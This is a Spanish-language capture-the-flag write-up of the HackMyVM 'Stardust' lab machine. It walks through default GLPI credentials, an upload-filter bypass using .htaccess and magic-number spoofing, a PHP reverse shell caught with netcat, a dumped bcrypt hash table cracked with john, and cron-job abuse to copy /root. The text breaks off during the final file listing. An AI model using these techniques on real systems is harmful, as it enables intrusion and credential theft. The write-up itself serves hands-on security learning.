<!DOCTYPE html>
<html lang="es"><head><meta charset="utf-8">
<meta http-equiv="content-type" content="text/html">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title itemprop="name">HackMyVM - Stardust | noname</title>
<meta property="og:title" content="HackMyVM - Stardust | noname" />
<meta name="twitter:title" content="HackMyVM - Stardust | noname" />
<meta itemprop="name" content="HackMyVM - Stardust | noname" />
<meta name="application-name" content="HackMyVM - Stardust | noname" />
<meta property="og:site_name" content="" />

<meta name="description" content="Writeup Stardust üü°">
<meta itemprop="description" content="Writeup Stardust üü°" />
<meta property="og:description" content="Writeup Stardust üü°" />
<meta name="twitter:description" content="Writeup Stardust üü°" />

<meta property="og:locale" content="es" />
<meta name="language" content="es" />



  <meta itemprop="image" content="https://0x-noname.github.io/machines/hmv/stardust/stardust_logo.webp" />
  <meta property="og:image" content="https://0x-noname.github.io/machines/hmv/stardust/stardust_logo.webp" />
  <meta name="twitter:image" content="https://0x-noname.github.io/machines/hmv/stardust/stardust_logo.webp" />
  <meta name="twitter:image:src" content="https://0x-noname.github.io/machines/hmv/stardust/stardust_logo.webp" />




    
    
    
    

    <meta property="og:type" content="article" />
    <meta property="og:article:published_time" content=2023-07-15T15:26:23&#43;0200 />
    <meta property="article:published_time" content=2023-07-15T15:26:23&#43;0200 />

    

    

    <script defer type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "Article",
        "headline": "HackMyVM - Stardust",
        "author": {
        "@type": "Person",
        "name": ""
        },
        "datePublished": "2023-07-15",
        "description": "Writeup Stardust üü°",
        "wordCount":  1218 ,
        "mainEntityOfPage": "True",
        "dateModified": "2023-07-15",
        "image": {
        "@type": "imageObject",
        "url": "\/machines\/hmv\/stardust\/stardust_logo.webp"
        },
        "publisher": {
        "@type": "Organization",
        "name": "noname"
        }
    }
    </script>



<meta name="generator" content="Hugo 0.111.3">

    

    <link rel="canonical" href="https://0x-noname.github.io/writeups/hmv/stardust/">
    <link href="/style.min.0dafdc75467b093a9691e40fa17265d2fe1f3baba37da4faf9af6a1b0b035248.css" rel="stylesheet">
    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">

    
    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
    <link rel="shortcut icon" href="/favicon.ico">




<link rel="manifest" href="https://0x-noname.github.io/site.webmanifest">

<meta name="msapplication-config" content="/browserconfig.xml">
<meta name="msapplication-TileColor" content="#2d89ef">
<meta name="theme-color" content="#434648">

    
    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">

    
    </head>
<body data-theme = "" class="notransition">
<script src="/js/themeLoader.min.3c3396ae9effcbd02e7064baa7b435ffe6560bcd7fec0b428a470d3a128f2220.js"></script>
<div class="navbar" role="navigation">
    <nav class="menu" aria-label="Main Navigation">
        <a href="https://0x-noname.github.io/" class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
stroke-linejoin="round" class="feather feather-home">
<title>Home</title>
<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
<polyline points="9 22 9 12 15 12 15 22"></polyline>
</svg>
        </a>
        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
        <label for="menu-trigger">
            <span class="menu-icon">
                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
            </span>
        </label>

        <div class="trigger">
            <ul class="trigger-container">
                
                
                <li>
                    <a class="menu-link " href="/">
                        $ home
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/posts/hackmyvm/">
                        $ hmv
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/posts/hackthebox/">
                        $ htb
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/posts/vulnyx/">
                        $ nyx
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/whoami/">
                        $ whoami
                    </a>
                    
                </li>
                
                <li class="menu-separator">
                    <span>|</span>
                </li>
            </ul>
            <a id="mode" href="#">
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
            </a>
        </div>
    </nav>
</div>

<div class="wrapper post">
    <main class="page-content" aria-label="Content">
        <article>
            <header class="header">
                <h1 class="header-title">HackMyVM - Stardust</h1>
                
                <div class="post-meta">
                    <time datetime="2023-07-15T15:26:23&#43;02:00" itemprop="datePublished"> Jul 15, 2023 </time>
                </div>
            </header><div class="page-content">
                <p><img src="/../machines/hmv/stardust/stardust_logo.webp" alt="logo"></p>
<ul>
<li><em>Bypass Content-Type and Magic Number</em></li>
<li><em>Upload Shell</em></li>
<li><em>Leaked Credentials</em></li>
<li><em>Cron Job Abuse</em></li>
</ul>
<h3 id="escaneo-de-puertos">Escaneo de puertos</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>‚ùØ nmap -p- -v -T5 -n 192.168.1.14
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
</span></span><span style="display:flex;"><span>22/tcp open  ssh
</span></span><span style="display:flex;"><span>80/tcp open  http
</span></span></code></pre></div><h3 id="escaneo-de-servicios">Escaneo de servicios</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>‚ùØ nmap -sVC -v -p 22,80 192.168.1.14
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   3072 dbf946e520816ceec72508ab2251366c (RSA)
</span></span><span style="display:flex;"><span>|   256 33c09564294723dd864ee6b8073367ad (ECDSA)
</span></span><span style="display:flex;"><span>|_  256 beaa6d4243dd7dd40e0d7478c189a136 (ED25519)
</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.56 ((Debian))
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.56 (Debian)
</span></span><span style="display:flex;"><span>|_http-title: Authentication - GLPI
</span></span><span style="display:flex;"><span>| http-methods: 
</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span style="display:flex;"><span>|_http-favicon: Unknown favicon MD5: C01D32D71C01C8426D635C68C4648B09
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><p>En el puerto 80 hay un formulario de login.</p>
<p><img src="/../machines/hmv/stardust/login.webp" alt="login"></p>
<p>Haciendo una b√∫squeda de credenciales por defecto encuentro lo siguiente.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>you have 4 differents profils  
</span></span><span style="display:flex;"><span>glpi/glpi (super-admin)  
</span></span><span style="display:flex;"><span>tech/tech  
</span></span><span style="display:flex;"><span>postonly/postonly (only for helpdesk)  
</span></span><span style="display:flex;"><span>normal/normal
</span></span></code></pre></div><p>Consigo acceso al dashboard con <code>glpi/glpi</code>.</p>
<p><img src="/../machines/hmv/stardust/dashboard.webp" alt="dashboard"></p>
<p>Encuentro un subdominio <code>intranetik.stardust.hmv</code>.</p>
<p><img src="/../machines/hmv/stardust/subdomain.webp" alt="subdomain"></p>
<p>Visito el nuevo subdominio y veo una herramienta para subir archivos. Los archivos <em>.php</em>, <em>.py</em>, <em>.sh</em>, <em>.asp</em> no est√°n autorizados.</p>
<p><img src="/../machines/hmv/stardust/upload.webp" alt="upload"></p>
<p>Con burpsuite intercepto la petici√≥n y la modifico para subir el archivo <code>.htaccess</code> agregando la directiva <code>AddType application/x-httpd-php .png</code> para que interprete los archivos <strong>.png</strong> como archivos <strong>PHP</strong>.</p>
<p><img src="/../machines/hmv/stardust/burp_htaccess.webp" alt="burp_htaccess"></p>
<p>Veo que se ha subido correctamente el archivo.</p>
<p><img src="/../machines/hmv/stardust/file_uploaded_success.webp" alt="file_uploaded_success"></p>
<p>Subo una shell php modificando el <strong>filename</strong> y el <strong>Content-Type</strong>, y le a√±ado el magic number asociado al <code>Content-Type</code> para saltarme la restricci√≥n del uploader.</p>
<p><img src="/../machines/hmv/stardust/rs_uploaded_success.webp" alt="rs_uploaded_success"></p>
<p>Con curl mando una petici√≥n para ejecutar la shell.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>‚ùØ curl -s http://intranetik.stardust.hmv/rs.png
</span></span></code></pre></div><p>Obtengo la shell como usuario www-data.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>‚ùØ nc -lvnp 443
</span></span><span style="display:flex;"><span>listening on [any] 443 ...
</span></span><span style="display:flex;"><span>connect to [192.168.1.18] from (UNKNOWN) [192.168.1.14] 51354
</span></span><span style="display:flex;"><span>Linux stardust.hmv 5.10.0-22-amd64 #1 SMP Debian 5.10.178-3 (2023-04-22) x86_64 GNU/Linux
</span></span><span style="display:flex;"><span> 19:57:48 up 27 min,  0 users,  load average: 0.00, 0.00, 0.00
</span></span><span style="display:flex;"><span>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span></span><span style="display:flex;"><span>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span></span><span style="display:flex;"><span>/bin/sh: 0: can&#39;t access tty; job control turned off
</span></span><span style="display:flex;"><span>$ script /dev/null -c bash
</span></span><span style="display:flex;"><span>Script started, output log file is &#39;/dev/null&#39;.
</span></span><span style="display:flex;"><span>www-data@stardust:/$ id
</span></span><span style="display:flex;"><span>id
</span></span><span style="display:flex;"><span>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span></span></code></pre></div><p>Enumero puertos internos.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>www-data@stardust:~/intranetik$ ss -ltun
</span></span><span style="display:flex;"><span>Netid State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
</span></span><span style="display:flex;"><span>udp   UNCONN 0      0            0.0.0.0:68        0.0.0.0:*          
</span></span><span style="display:flex;"><span>tcp   LISTEN 0      80         127.0.0.1:3306      0.0.0.0:*          
</span></span><span style="display:flex;"><span>tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*          
</span></span><span style="display:flex;"><span>tcp   LISTEN 0      511                *:80              *:*          
</span></span><span style="display:flex;"><span>tcp   LISTEN 0      128             [::]:22           [::]:*
</span></span></code></pre></div><p>Con linpeas encuentro lo siguiente.</p>
<p><img src="/../machines/hmv/stardust/mysql_pass_glpi.webp" alt="mysql_pass_glpi"></p>
<p>Me conecto al servidor mysql.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>www-data@stardust:/tmp$ mysql -u glpi -p
</span></span><span style="display:flex;"><span>Enter password: 
</span></span><span style="display:flex;"><span>Welcome to the MariaDB monitor.  Commands end with ; or \g.
</span></span><span style="display:flex;"><span>Your MariaDB connection id is 42
</span></span><span style="display:flex;"><span>Server version: 10.5.19-MariaDB-0+deb11u2 Debian 11
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>MariaDB [(none)]&gt; show databases;
</span></span><span style="display:flex;"><span>+--------------------+
</span></span><span style="display:flex;"><span>| Database           |
</span></span><span style="display:flex;"><span>+--------------------+
</span></span><span style="display:flex;"><span>| glpi               |
</span></span><span style="display:flex;"><span>| information_schema |
</span></span><span style="display:flex;"><span>| intranetikDB       |
</span></span><span style="display:flex;"><span>+--------------------+
</span></span><span style="display:flex;"><span>3 rows in set (0.002 sec)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>MariaDB [(none)]&gt; use intranetikDB;
</span></span><span style="display:flex;"><span>Reading table information for completion of table and column names
</span></span><span style="display:flex;"><span>You can turn off this feature to get a quicker startup with -A
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Database changed
</span></span><span style="display:flex;"><span>MariaDB [intranetikDB]&gt; show tables;
</span></span><span style="display:flex;"><span>+------------------------+
</span></span><span style="display:flex;"><span>| Tables_in_intranetikDB |
</span></span><span style="display:flex;"><span>+------------------------+
</span></span><span style="display:flex;"><span>| users                  |
</span></span><span style="display:flex;"><span>+------------------------+
</span></span><span style="display:flex;"><span>1 row in set (0.000 sec)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>MariaDB [intranetikDB]&gt; select * from users;
</span></span><span style="display:flex;"><span>+----+-----------+--------------------------------------------------------------+
</span></span><span style="display:flex;"><span>| id | username  | password                                                     |
</span></span><span style="display:flex;"><span>+----+-----------+--------------------------------------------------------------+
</span></span><span style="display:flex;"><span>|  1 | carolynn  | $2b$12$HRVJrlSG5eSW44VaNlTwoOwu42c1l9AnbpOhDvcEXVMyhcB46ZtXC |
</span></span><span style="display:flex;"><span>|  2 | chi-yin   | $2b$12$.sDM7vxQCe3nmOois5Ho4O1HkNEiz4UJ/9XEsYlnbH7Awlxfig3g2 |
</span></span><span style="display:flex;"><span>|  3 | tally     | $2b$12$z*******************************************tNy4Ycjl. |
</span></span><span style="display:flex;"><span>|  4 | jeraldine | $2b$12$gjwlFI7f1QABeZ5jKlbTh.L00oIBXxHOUH.Gah.SXnX4PPrLd0mI6 |
</span></span><span style="display:flex;"><span>|  5 | ishmael   | $2b$12$eEeCfKVkmFCvXjubRp.GhOKNTz0JoVXoKYCM3/kylN8AMzoDVEoWC |
</span></span><span style="display:flex;"><span>|  6 | hetty     | $2b$12$uu719jU2sXy.blBj2QEPR.7mg2UbVfL5eX9KM4aXV5rigHWjFGNvO |
</span></span><span style="display:flex;"><span>|  7 | yvan      | $2b$12$QJZj2WvvQU6c2GjpmW/Z9O0Ggudv5hhrREfqfJK7jjDWAa7.GoTM. |
</span></span><span style="display:flex;"><span>|  8 | nong      | $2b$12$JWqnC1emWOLZszg1bWX3her2xFp47ZLE5MEd0YitoUDbVHH6lBPHW |
</span></span><span style="display:flex;"><span>|  9 | ande      | $2b$12$03pXHnhLpgaGfeY72FtwJ.1T5IgCxHF.1PrPUVFySI4fIV3Gnykvq |
</span></span><span style="display:flex;"><span>| 10 | colleen   | $2b$12$ZwPxWr9.g5VoiFQfWUJtgeTuNcpzpD44BrOVRafrnXHIa3Pc9mK1C |
</span></span><span style="display:flex;"><span>| 11 | gussi     | $2b$12$f/05LxKgsAt6KNJ676sG/.90OvOMyUxuP2OdtZ9d8AnSmhP8ZIIA2 |
</span></span><span style="display:flex;"><span>| 12 | brandi    | $2b$12$wQKGmPPRclBk4KpT3e44q.EOIh.xki.70W62xDuPnybXKYeXOSd2u |
</span></span><span style="display:flex;"><span>| 13 | karrie    | $2b$12$bZVRUGzKjDGqOGKzWgcWUehPiwBseDScXfmsTZJb.r58Uc5uxFFUC |
</span></span><span style="display:flex;"><span>| 14 | maala     | $2b$12$D0kAwa0fGU055rUnPJHMLuuB0fHcGjKbjLw9oNi/IMFkbzP980fvS |
</span></span><span style="display:flex;"><span>| 15 | brittany  | $2b$12$hgjI3XifZTqfMCSM4TOqTObHNLNvkT0FhwiAJ7zr/GGLM58b4ieVC |
</span></span><span style="display:flex;"><span>+----+-----------+--------------------------------------------------------------+
</span></span><span style="display:flex;"><span>15 rows in set (0.000 sec)
</span></span></code></pre></div><p>Con john rompo el hash.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>‚ùØ john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
</span></span><span style="display:flex;"><span>Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
</span></span><span style="display:flex;"><span>Cost 1 (iteration count) is 4096 for all loaded hashes
</span></span><span style="display:flex;"><span>Will run 4 OpenMP threads
</span></span><span style="display:flex;"><span>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
</span></span><span style="display:flex;"><span>b****a           (?)    
</span></span></code></pre></div><p>Me conecto a la m√°quina con el usuario tally.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>‚ùØ ssh tally@192.168.1.14
</span></span><span style="display:flex;"><span>tally@192.168.1.14&#39;s password: 
</span></span><span style="display:flex;"><span>Linux stardust.hmv 5.10.0-22-amd64 #1 SMP Debian 5.10.178-3 (2023-04-22) x86_64
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>The programs included with the Debian GNU/Linux system are free software;
</span></span><span style="display:flex;"><span>the exact distribution terms for each program are described in the
</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span></span><span style="display:flex;"><span>permitted by applicable law.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>tally@stardust:~$ id
</span></span><span style="display:flex;"><span>uid=1000(tally) gid=1000(tally) groups=1000(tally)
</span></span></code></pre></div><p>Subo el binario pspy64 a la m√°quina objetivo, lo Lanzo y veo que hay una tarea cron que se lanza como root.</p>
<p><img src="/../machines/hmv/stardust/pspy_meteo.webp" alt="pspy_meteo"></p>
<p>Dentro de la carpeta <strong>/opt</strong> encuentro los siguientes archivos.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>tally@stardust:/opt$ ls -l
</span></span><span style="display:flex;"><span>-rw-rw-r--+  1 root root   50 Jul 14 20:54 config.json
</span></span><span style="display:flex;"><span>-rwxr-xr-x   1 root root  607 May  7 09:49 meteo
</span></span></code></pre></div><p>Lanzo el script meteo para ver de que se trata.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>tally@stardust:/opt$ ./meteo 
</span></span><span style="display:flex;"><span>Weather is cool !
</span></span></code></pre></div><p>En el archivo <code>config.json</code> hay las coordenadas geogr√°ficas de un lugar espec√≠fico.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;latitude&#34;</span>:  <span style="color:#ae81ff">-18.48</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;longitude&#34;</span>: <span style="color:#ae81ff">-70.33</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Archivo <strong>meteo</strong>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#! /bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#meteo</span>
</span></span><span style="display:flex;"><span>config<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/opt/config.json&#34;</span>
</span></span><span style="display:flex;"><span>latitude<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>jq <span style="color:#e6db74">&#39;.latitude&#39;</span> $config<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>longitude<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>jq <span style="color:#e6db74">&#39;.longitude&#39;</span> $config<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>limit<span style="color:#f92672">=</span><span style="color:#ae81ff">1000</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#sys</span>
</span></span><span style="display:flex;"><span>web<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/var/www/intranetik&#34;</span>
</span></span><span style="display:flex;"><span>users<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/home/tally&#34;</span>
</span></span><span style="display:flex;"><span>root<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/root&#34;</span>
</span></span><span style="display:flex;"><span>dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/var/backups&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#get rain elevation </span>
</span></span><span style="display:flex;"><span>elevation<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>curl -s <span style="color:#e6db74">&#34;https://api.open-meteo.com/v1/forecast?latitude=</span>$latitude<span style="color:#e6db74">&amp;longitude=</span>$longitude<span style="color:#e6db74">&amp;hourly=rain&#34;</span> |jq .elevation<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> $elevation -gt $limit <span style="color:#f92672">]]</span> ; <span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;RAIN ALERT !&#34;</span>
</span></span><span style="display:flex;"><span>tar -cf $dest/backup.tar $web &gt;/dev/null
</span></span><span style="display:flex;"><span>tar -rf $dest/backup.tar $users &gt;/dev/null
</span></span><span style="display:flex;"><span>tar -rf $dest/backup.tar $root &gt;/dev/null
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;BACKUP FINISHED&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;Weather is cool !&#34;</span>
</span></span></code></pre></div><blockquote>
<p>Este script obtiene datos meteorol√≥gicos del <code>config.json</code>, verifica si hay una alerta de lluvia basada en la elevaci√≥n de la ubicaci√≥n y realiza copias de seguridad de ciertos directorios si hay una alerta de lluvia. De lo contrario muestra un mensaje indicando que el clima est√° bien.</p>
</blockquote>
<p>Hago una b√∫squeda en internet de las coordenadas del monte everest.</p>
<p><img src="/../machines/hmv/stardust/lonLatEverest.webp" alt="lonLatEverest"></p>
<p>Edito el fichero <code>config.json</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;latitude&#34;</span>:  <span style="color:#ae81ff">27.986065</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;longitude&#34;</span>: <span style="color:#ae81ff">86.922623</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Lanzo el script y me muestra una alerta de lluvia, pero no me generar√° el <code>backup.tar</code> porque he lanzando el script como usuario y por eso salen los mensajes de <strong>permission denied</strong>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>tally@stardust:/opt$ ./meteo 
</span></span><span style="display:flex;"><span>RAIN ALERT !
</span></span><span style="display:flex;"><span>tar: /var/backups/backup.tar: Cannot open: Permission denied
</span></span><span style="display:flex;"><span>tar: Error is not recoverable: exiting now
</span></span><span style="display:flex;"><span>tar: /var/backups/backup.tar: Cannot read: Bad file descriptor
</span></span><span style="display:flex;"><span>tar: At beginning of tape, quitting now
</span></span><span style="display:flex;"><span>tar: Error is not recoverable: exiting now
</span></span><span style="display:flex;"><span>tar: /var/backups/backup.tar: Cannot read: Bad file descriptor
</span></span><span style="display:flex;"><span>tar: At beginning of tape, quitting now
</span></span><span style="display:flex;"><span>tar: Error is not recoverable: exiting now
</span></span><span style="display:flex;"><span>BACKUP FINISHED
</span></span></code></pre></div><p>Espero unos segundos y en la carpeta <strong>/backups</strong> tengo el archivo <code>backup.tar</code> que me ha generado la tarea cron.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>tally@stardust:/var/backups$ ls backup.tar 
</span></span><span style="display:flex;"><span>backup.tar
</span></span></code></pre></div><p>Descomprimo el archivo <code>backup.tar</code> en <strong>/tmp</strong> y dentro puedo ver lo siguiente.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>tally@stardust:/tmp/root$ ls -la
</span></span><span style="display:flex;"><span>total 32
</span></span><span style="display:flex;"><span>drwx------  4 tally tally 4096 May  8 13:06 .
</span></span><span style="display:flex;"><span>drwxrwxrwt 13 root  root  4096 Jul 14 22:09 ..
</span></span><span style="display:flex;"><span>-rw-------  1 tally tally  359 May  8 16:27 .bash_history
</span></span><span style="display:flex;"><span>-rw-r--r--  1 tally tally  571 Apr 10  2021 .bashrc
</span></span><span style="display:flex;"><span>drwxr-xr-x  3 tally tally 4096 Feb  6 19:32 .local
</span></span><span style="display:flex;"><span>-rw-r--r--  1 tally tally  161 Jul  9  2019 .profile
</span></span><span style="display:flex;"><span>-rwx------  1 tally tally   33 Feb  6 19:34 root.txt
